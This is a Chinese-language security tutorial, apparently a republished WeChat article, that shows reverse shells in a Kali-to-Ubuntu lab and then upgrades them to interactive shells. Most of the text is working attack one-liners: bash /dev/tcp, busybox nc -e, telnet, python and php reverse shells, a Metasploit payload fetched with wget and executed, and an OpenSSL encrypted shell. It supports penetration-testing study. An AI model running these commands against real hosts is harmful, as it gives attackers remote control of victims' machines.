---
title: 技巧分享-反弹Shell-升级交互式Shell-011
url: https://mp.weixin.qq.com/s/7eLMTvQbgzOsMhC2wmX2kQ
source: Doonsec's feed
date: 2026-03-22
fetch_date: 2026-03-23T04:20:01.896368
---

# 技巧分享-反弹Shell-升级交互式Shell-011

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/gXAevUkAZorYLjo5fnDSsH9oage5x6Gw3BQ0ib0OuCq1QDPfHA9qVxoNuU597txobzUwB7zg5fdvgPJeiaKAaDFg/0?wx_fmt=jpeg)

# 技巧分享-反弹Shell-升级交互式Shell-011

六边形攻防安全

![]()

在小说阅读器中沉浸阅读

以下文章来源于F0ne
，作者F0ne

![](http://wx.qlogo.cn/mmhead/y5RpFDuUObyLFMbEcWg1HRPRUMB9XVh6xF7YEGtAHQbMKJy8aibrTxDiaq4rpF04u5U2mIvG7gsC4/0)

**F0ne**
.

一名热爱学习与分享的网络安全从业者，专注于持续更新信息安全学习笔记、CTF 与靶场解析、渗透测试研究及应急响应经验，致力于传播网络安全知识与实践心得。

**技巧分享-反弹Shell-升级交互式Shell**

*不积跬步无以至千里，不积小流无以成江海。*

---

**目录结构**

* 环境准备
* 反弹shell

+ 概述
+ 常见反弹shell
+ 反弹shell示例

- bash反弹shell
- busybox反弹shell
- telnet反弹shell
- python反弹shell
- php反弹shell
- metasploit反弹shell
- openssl反弹加密shell

* 升级交互式shell

+ 升级至半交互式shell
+ 升级至完整型交互式shell
+ 调整shell显示大小

* 工具介绍

---

**环境准备**

使用工具：ubuntu虚拟机、kali虚拟机

网络连接配置：将kali虚拟机与ubuntu虚拟机配置同一网络环境

---

**反弹Shell**

**1、概述**

**Shell****：**Shell是操作系统的用户界面，它为用户与系统内核之间提供了交互的接口。用户通过Shell输入命令，Shell则负责解析这些命令，并将它们传递给操作系统内核去执行。Shell可以理解为一个命令解释器，它使得用户能够通过命令行与计算机进行操作，而不需要直接操作复杂的内核。

**常见的Shell类型****：**bash、sh、zsh、csh、tcsh、ksh和fish，其中bash是Linux中使用最广泛的Shell。

**反弹Shell****：**攻击者通过监听某个TCP/UDP端口作为服务端，等待受害主机的连接。当受害主机主动向攻击者发起请求后，受害主机会将其本地的Shell接口（命令行控制权）交给攻击者。通过这个Shell，攻击者可以像在本地操作一样，执行受害主机上的任意系统命令。

**2、常见的反弹Shell**

反弹Shell分为：正向Shell和反向Shell。

**反向Shell****：**由受害者主动连接攻击者监听的端口。在这种情况下，受害者通常可以访问外网，能够直接访问攻击者服务器的IP地址。这种方法常用于绕过防火墙或NAT限制，因为受害者发起连接后，攻击者就可以获取到受害者的Shell（命令行控制权）。

**正向Shell****：**由攻击者主动连接受害者监听的端口。在这种情况下，受害者通常无法直接访问外网，但可以通过地址映射将固定端口映射到其出口IP上。攻击者利用映射出的端口，主动发起连接，以获取受害者的Shell（命令行控制权）。这种方式在防火墙和NAT环境中常见，因为受害者的机器并不是主动向外部发起连接。

**2.1 反弹shell示例**

常见反弹shell：利用编程语言（golang、python、c、c++、php等）反弹shell，利用终端命令（bash、powershell、nc、busybox、ncat、telnet等）反弹shell，利用远控工具（Metasploit、Cobalt Strike等）反弹shell。

**2.1.1 bash 反弹shell**

```
攻击机器(192.168.118.128)：nc -lvvp 1234
受害机器(192.168.118.129)：bash -i >& /dev/tcp/192.168.118.128/1234 0>&1
```

利用bash命令成功将shell反弹至kali攻击机。

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ05icic8iah6X8CempucjBQ2tG334juqzBRmc6YCcCLVWgbRt6CvP1Lx5DA/640?wx_fmt=png&from=appmsg)

**2.1.2 busybox反弹shell**

busybox工具：集成了大多数常用的Linux终端命令。通过在命令行输入busybox 可以查看其支持的所有命令。对于系统中未安装或损坏的命令，可以通过busybox来执行相应功能。

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0krlyXly7Z01AHsHvRsxounN1ibsfoPqY4WGFriaphpqciaVhIIpqSIgJg/640?wx_fmt=png&from=appmsg)

```
攻击机器(192.168.118.128)：nc -lvvp 1234
受害机器(192.168.118.129)：busybox nc 192.168.118.128 1234 -e /bin/bash
```

利用busybox命令成功将shell反弹至kali攻击机。

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0AFhealUBvtky8McRCvKziaePczaNlCVsQPZ0OIaQSbMhoOP1gAgCiaeQ/640?wx_fmt=png&from=appmsg)

**2.1.3 telnet反弹shell**

```
攻击机器(192.168.118.128)：nc -lvvp 1234
受害机器(192.168.118.129)：TF=$(mktemp -u);mkfifo $TF && telnet 192.168.118.128 1234 0<$TF | sh 1>$TF
```

利用telnet命令成功将shell反弹至kali攻击机。

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0wSS7EGbBGvL3NCXzApSQ7X1QAvIJq4btianIIcSvicS3pKxfn571toSg/640?wx_fmt=png&from=appmsg)

**2.1.4 python反弹shell**

```
攻击机器(192.168.118.128)：nc -lvvp 1234
```

```
受害机器(192.168.118.129)：python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.128",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

利用python语言成功将shell反弹至kali攻击机。

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0swI0BpKboYgpQmMOumZibNWOQx2hm68puAticwMPILQLfiaPicYxkEBdLg/640?wx_fmt=png&from=appmsg)

**2.1.5 php反弹shell**

```
攻击机器(192.168.118.128)：nc -lvvp 1234
受害机器(192.168.118.128)：php -r '$sock=fsockopen("192.168.118.128",1234);exec("sh <&3 >&3 2>&3");'
```

利用php语言成功将shell反弹至kali攻击机。

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0Cq4XswCESCyQiczL5ibPUic2QOkj74NH2x9aVVOBZy8wDiaIMjOn5eblMA/640?wx_fmt=png&from=appmsg)

**2.1.6 Metasploit反弹shell**

使用metasploit反弹shell，需首先确认受害主机操作系统类型和版本，以Linux aarch64为例（使用uname -a查看系统版本信息）：

```
攻击机器(192.168.118.128)
1、开启监听：
msfconsole -q -x "use multi/handler; set payload linux/aarch64/shell_reverse_tcp; set lhost 192.168.118.128; set lport 1234; exploit"
2、生成后门shell文件：
msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=192.168.118.128 LPORT=1234 -f elf -o reverse.elf
3、python开启web服务
 python3 -m http.server 80
```

kali攻击机开启监听；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0UDeKUBCQicicc6TobvI7WTIXxL9Xmplb6y47IvqMu3ypJ4ssHKhSckZA/640?wx_fmt=png&from=appmsg)

kali攻击机生成后门shell文件；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ09VauA8kb3NVklJlNSZlibsibQEOLyVzFmXzbn5nYXT6Z3fHWniaiciadOZw/640?wx_fmt=png&from=appmsg)

python创建web服务，用于受害机下载后门文件；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0ZjI5aecrFDtia7gHxK6s9Z5vlaibqvJVCqnlvy9j13SX1kl4BxJ8zY8w/640?wx_fmt=png&from=appmsg)

```
受害机器(192.168.118.129)
1、下载后门shell至受害服务器（curl、wget）
cd /tmp && wget http://192.168.118.128/reverse.elf && chmod +x reverse.elf
2、执行后门shell文件
./reverse.elf
```

受害机下载后门shell文件，并执行；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0L3gsJLbZGibXhGwEggiaXIKO7HuPoXZAej9iadExHYd4QNGibyiaFT4e0eA/640?wx_fmt=png&from=appmsg)

利用metasploit工具成功将shell反弹至kali攻击机。

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0IJOIU2jnL1PzcKZxjmAiaKgxBxXjsRcMycLtvOCpHTpibOAlZmGcm2JA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0Kf7IXiaic6NrvlaSepaTbjGN5OvCXPSz7ic9Dz9haFxia5aBXKXncdYib6g/640?wx_fmt=png&from=appmsg)

**2.1.7 OpenSSL反弹加密shell**

```
攻击机器(192.168.118.128)：
1、生成加密证书：
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
2、开启监听
openssl s_server -quiet -key key.pem -cert cert.pem -port 1234

受害机器(192.168.118.129)：
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.118.128:1234 > /tmp/s; rm /tmp/s
```

kali攻击机生成openssl加密证书；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0P7Z762t4fzuuA4aHCJ0qcbsnbDEQ0BQOWibCIcUfYo8CtCyj3aozVFQ/640?wx_fmt=png&from=appmsg)

kali攻击机开启监听；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ08XZibyg4urcJ0kcqBWJgdbpOzaqM4PHvmPgeaKp25iaWPWNtnWQ0euAg/640?wx_fmt=png&from=appmsg)

受害机执行反弹shell命令；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0ApQ0Vn1AUKR4W7icWZ0LYapiaydJYJicaPHWt4wRnF2Lib4cWcCLVtnHNw/640?wx_fmt=png&from=appmsg)

利用openssl成功将shell反弹至kali攻击机。

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0xCkUKEll9nqY4xWkhrXvU0ruFib2jF8QribTEicdTTyIkz9q8x9tBj08A/640?wx_fmt=png&from=appmsg)

**升级交互式Shell**

在获得反向 shell 后，如果需要执行交互式命令（例如使用 vi 编辑文件或进行数据库操作），可能会遇到无法执行的情况。这是因为反向 shell 通常是非交互式的，无法提供命令提示、自动补全或编辑功能。此时，您需要将反向 shell 升级为交互式 shell，以便能够顺利执行这些命令。

**1、升级为半交互式shell**

```
方法一：
python3 -c 'import pty;pty.spawn("/bin/bash")'

方法二：
/usr/bin/script -qc /bin/bash /dev/null
```

演示通过nc将受害机shell反弹至kali攻击机，此时并非交互型shell；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0HH0Fm0gEyKc5Ozl76bSuYfW1OPffWLrYbCbAqVibT72IUZzGrJpsjQQ/640?wx_fmt=png&from=appmsg)

执行方法一或方法二中的任意一个，可以将shell升级为半交互式。升级成功后，命令行会显示用户信息，但仍然无法进行命令补全和提示。此时，使用Control+C会导致shell 退出。此时shell已经支持数据库登录、用户切换等操作。

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0hfGmBzM73httmTicI5xKjl66ibRD5KiapfMtz4FdZAOBQXthW0fxkMEIA/640?wx_fmt=png&from=appmsg)

**2、升级为完整型交互式shell**

```
1、使用control+z，将当前shell挂起
2、stty raw -echo;fg
3、reset
4、echo $TERM # 如果第三步执行后需要输入终端类型，在受害机执行echo $TERM获取终端类型然后输入即可
```

使用control+z将shell挂起；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0LB22F7nVy64uibJad3dHjaVq3tOrMY14t7qIpwPNHUCOtiabf9PW4APw/640?wx_fmt=png&from=appmsg)

执行stty命令；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0a2UETWmeIpTvSHuva4MXP6VneNib1AHfFibPduaniansCr5zXmp4w1I0Q/640?wx_fmt=png&from=appmsg)

执行reset；

![](https://mmbiz.qpic.cn/mmbiz_png/gXAevUkAZopxzmWqSbmic8ObYJM9LMAZ0AA8gwgmUmT6FO3gauibwic4XL9du4HbLZc6JV5VRFGNOPa30icvjJlamw/640?wx_fmt=png&from=appmsg)

成功升级为完整的交互式shell；

![](https://mmbiz.qpic.cn/mmb...